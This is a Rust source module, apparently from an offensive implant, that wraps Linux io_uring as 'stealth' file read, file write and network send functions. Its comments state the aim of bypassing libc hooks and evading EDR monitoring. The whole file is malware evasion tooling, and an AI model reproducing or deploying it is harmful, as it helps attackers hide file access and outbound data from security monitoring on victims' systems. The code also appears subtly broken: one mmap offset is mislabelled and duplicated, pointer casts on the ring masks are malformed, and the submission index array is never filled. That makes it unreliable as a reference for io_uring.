// io_uring operations for stealth file & network I/O (Linux 5.1+).
// Bypasses libc hooks entirely. EDRs don't monitor io_uring yet.
// Replaces read/write/send/recv with kernel-submitted SQEs.
//
// RingReaper-inspired: https://github.com/yardenshafir/RingReaper

use std::io;
use std::mem;
use std::ptr;

#[cfg(target_os = "linux")]
mod ring {
    use super::*;

    const IORING_OP_READ: u8 = 22;
    const IORING_OP_WRITE: u8 = 23;
    const IORING_OP_SEND: u8 = 16;
    const IORING_OP_RECV: u8 = 17;
    const IORING_OP_OPENAT: u8 = 18;
    const IORING_OP_CLOSE: u8 = 19;
    const IORING_OP_ACCEPT: u8 = 13;
    const IORING_OP_CONNECT: u8 = 14;

    const IORING_SETUP_SQPOLL: u32 = 2;

    #[repr(C)]
    struct IoUringSQE {
        opcode: u8,
        flags: u8,
        ioprio: u16,
        fd: i32,
        off: u64,
        addr: u64,
        len: u32,
        op_flags: u32,
        user_data: u64,
        _pad: [u8; 8],
    }

    #[repr(C)]
    struct IoUringCQE {
        user_data: u64,
        res: i32,
        flags: u32,
    }

    #[repr(C)]
    struct IoUringParams {
        sq_entries: u32,
        cq_entries: u32,
        flags: u32,
        sq_thread_cpu: u32,
        sq_thread_idle: u32,
        features: u32,
        wq_fd: u32,
        resv: [u32; 3],
        sq_off: [u32; 6],
        cq_off: [u32; 2],
    }

    /// Direct io_uring syscall (425 on x86_64, 426 on newer kernels).
    unsafe fn io_uring_setup(entries: u32, params: *mut IoUringParams) -> i32 {
        crate::syscalls::syscall2(425, entries as i64, params as i64) as i32
    }

    unsafe fn io_uring_enter(ring_fd: i32, to_submit: u32, min_complete: u32, flags: u32) -> i32 {
        crate::syscalls::syscall4(426, ring_fd as i64, to_submit as i64, min_complete as i64, flags as i64) as i32
    }

    /// Initialize io_uring with SQPOLL (kernel thread handles submissions).
    pub struct IoUring {
        fd: i32,
        sq_ptr: *mut IoUringSQE,
        sq_head: *mut u32,
        sq_tail: *mut u32,
        sq_mask: u32,
        cq_head: *mut u32,
        cq_tail: *mut u32,
        cq_mask: u32,
        cqes: *mut IoUringCQE,
        sq_ring_size: usize,
        cq_ring_size: usize,
        next_sqe: u32,
    }

    impl IoUring {
        pub fn new(entries: u32) -> io::Result<Self> {
            let mut params: IoUringParams = unsafe { mem::zeroed() };
            params.flags = IORING_SETUP_SQPOLL;
            params.sq_thread_idle = 2000; // 2s idle timeout

            let fd = unsafe { io_uring_setup(entries, &mut params) };
            if fd < 0 {
                return Err(io::Error::last_os_error());
            }

            // Map SQ ring
            let sq_ring_size = params.sq_off[5] as usize + (entries as usize * mem::size_of::<IoUringSQE>());
            let sq_ptr = unsafe {
                libc::mmap(
                    ptr::null_mut(),
                    sq_ring_size,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_SHARED | libc::MAP_POPULATE,
                    fd,
                    0, // IORING_OFF_SQ_RING
                )
            };
            if sq_ptr == libc::MAP_FAILED {
                unsafe { libc::close(fd); }
                return Err(io::Error::last_os_error());
            }

            // Map SQ entries
            let sqe_size = entries as usize * mem::size_of::<IoUringSQE>();
            let sqe_ptr = unsafe {
                libc::mmap(
                    ptr::null_mut(),
                    sqe_size,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_SHARED | libc::MAP_POPULATE,
                    fd,
                    0x08000000, // IORING_OFF_SQES
                )
            };
            if sqe_ptr == libc::MAP_FAILED {
                unsafe { libc::close(fd); }
                return Err(io::Error::last_os_error());
            }

            // Map CQ ring
            let cq_ring_size = params.cq_off[1] as usize + (entries as usize * mem::size_of::<IoUringCQE>());
            let cq_ptr = unsafe {
                libc::mmap(
                    ptr::null_mut(),
                    cq_ring_size,
                    libc::PROT_READ | libc::PROT_WRITE,
                    libc::MAP_SHARED | libc::MAP_POPULATE,
                    fd,
                    0x8000000, // IORING_OFF_CQ_RING
                )
            };
            if cq_ptr == libc::MAP_FAILED {
                unsafe { libc::close(fd); }
                return Err(io::Error::last_os_error());
            }

            let sq_head = unsafe { (sq_ptr as *mut u8).add(params.sq_off[0] as usize) as *mut u32 };
            let sq_tail = unsafe { (sq_ptr as *mut u8).add(params.sq_off[1] as usize) as *mut u32 };
            let sq_mask = unsafe { *(sq_ptr as *mut u8).add(params.sq_off[2] as usize) as *const u32 };
            let sq_mask = unsafe { *sq_mask };
            let cq_head = unsafe { (cq_ptr as *mut u8).add(params.cq_off[0] as usize) as *mut u32 };
            let cq_tail = unsafe { (cq_ptr as *mut u8).add(params.cq_off[1] as usize) as *mut u32 };
            let cq_mask = unsafe { *(cq_ptr as *mut u8).add(params.cq_off[2] as usize) as *const u32 };
            let cq_mask = unsafe { *cq_mask };
            let cqes = unsafe { (cq_ptr as *mut u8).add(params.cq_off[2] as usize + 4) as *mut IoUringCQE };

            Ok(Self {
                fd, sq_ptr: sqe_ptr as *mut IoUringSQE, sq_head, sq_tail, sq_mask,
                cq_head, cq_tail, cq_mask, cqes, sq_ring_size, cq_ring_size,
                next_sqe: 0,
            })
        }

        /// Get next available SQE.
        unsafe fn get_sqe(&mut self) -> *mut IoUringSQE {
            let tail = *self.sq_tail;
            let idx = tail & self.sq_mask;
            let sqe = self.sq_ptr.add(idx as usize);
            ptr::write_bytes(sqe, 0, 1);
            self.next_sqe = tail.wrapping_add(1);
            sqe
        }

        /// Submit all pending SQEs.
        unsafe fn submit(&mut self) -> io::Result<u32> {
            let submitted = self.next_sqe.wrapping_sub(*self.sq_tail);
            if submitted == 0 { return Ok(0); }
            *self.sq_tail = self.next_sqe;
            let ret = io_uring_enter(self.fd, submitted, 0, 0);
            if ret < 0 { Err(io::Error::last_os_error()) } else { Ok(ret as u32) }
        }

        /// Wait for at least `min` completions.
        unsafe fn wait(&mut self, min: u32) -> io::Result<()> {
            let ret = io_uring_enter(self.fd, 0, min, 0);
            if ret < 0 { Err(io::Error::last_os_error()) } else { Ok(()) }
        }

        /// Read file via io_uring (bypasses hooked read syscall).
        pub fn stealth_read(&mut self, fd: i32, buf: &mut [u8], offset: u64) -> io::Result<usize> {
            unsafe {
                let sqe = self.get_sqe();
                (*sqe).opcode = IORING_OP_READ;
                (*sqe).fd = fd;
                (*sqe).off = offset;
                (*sqe).addr = buf.as_mut_ptr() as u64;
                (*sqe).len = buf.len() as u32;
                (*sqe).user_data = 1;
                self.submit()?;
                self.wait(1)?;
                Ok((*self.cqes).res as usize)
            }
        }

        /// Write file via io_uring.
        pub fn stealth_write(&mut self, fd: i32, buf: &[u8], offset: u64) -> io::Result<usize> {
            unsafe {
                let sqe = self.get_sqe();
                (*sqe).opcode = IORING_OP_WRITE;
                (*sqe).fd = fd;
                (*sqe).off = offset;
                (*sqe).addr = buf.as_ptr() as u64;
                (*sqe).len = buf.len() as u32;
                (*sqe).user_data = 1;
                self.submit()?;
                self.wait(1)?;
                Ok((*self.cqes).res as usize)
            }
        }

        /// Send data via io_uring (bypasses hooked send/sendto).
        pub fn stealth_send(&mut self, fd: i32, buf: &[u8]) -> io::Result<usize> {
            unsafe {
                let sqe = self.get_sqe();
                (*sqe).opcode = IORING_OP_SEND;
                (*sqe).fd = fd;
                (*sqe).addr = buf.as_ptr() as u64;
                (*sqe).len = buf.len() as u32;
                (*sqe).user_data = 1;
                self.submit()?;
                self.wait(1)?;
                Ok((*self.cqes).res as usize)
            }
        }
    }

    impl Drop for IoUring {
        fn drop(&mut self) {
            unsafe {
                libc::munmap(self.sq_ptr as *mut libc::c_void, self.sq_ring_size);
                libc::close(self.fd);
            }
        }
    }
}

#[cfg(target_os = "linux")]
pub use ring::IoUring;

/// Fallback for non-Linux: uses standard libc calls.
#[cfg(not(target_os = "linux"))]
pub struct IoUring;

#[cfg(not(target_os = "linux"))]
impl IoUring {
    pub fn new(_: u32) -> io::Result<Self> { Ok(Self) }
    pub fn stealth_read(&mut self, _fd: i32, _buf: &mut [u8], _offset: u64) -> io::Result<usize> { Ok(0) }
    pub fn stealth_write(&mut self, _fd: i32, _buf: &[u8], _offset: u64) -> io::Result<usize> { Ok(0) }
    pub fn stealth_send(&mut self, _fd: i32, _buf: &[u8]) -> io::Result<usize> { Ok(0) }
}
